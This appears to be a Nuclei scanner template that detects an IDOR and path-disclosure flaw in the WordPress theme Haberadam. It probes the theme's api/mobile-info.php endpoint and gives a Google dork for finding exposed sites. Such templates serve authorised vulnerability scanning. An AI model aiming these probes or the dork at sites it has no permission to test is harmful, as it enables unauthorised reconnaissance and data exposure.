id: wp-Haberadam-theme-idor

info:
  name: WordPress Themes Haberadam IDOR and Full Path Disclosure via JSON API
  author: pussycat0x
  severity: high
  metadata:
    google-dork: inurl:/wp-content/themes/haberadam/
  reference:
    - https://cxsecurity.com/issue/WLB-2021090078
  tags: wordpress,idor
requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-content/themes/haberadam/api/mobile-info.php?id='
      - '{{BaseURL}}/blog/wp-content/themes/haberadam/api/mobile-info.php?id='
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "status"
          - "hava"
          - "degree"
          - "icon"
        part: body
        condition: and
      - type: status
        status:
          - 200
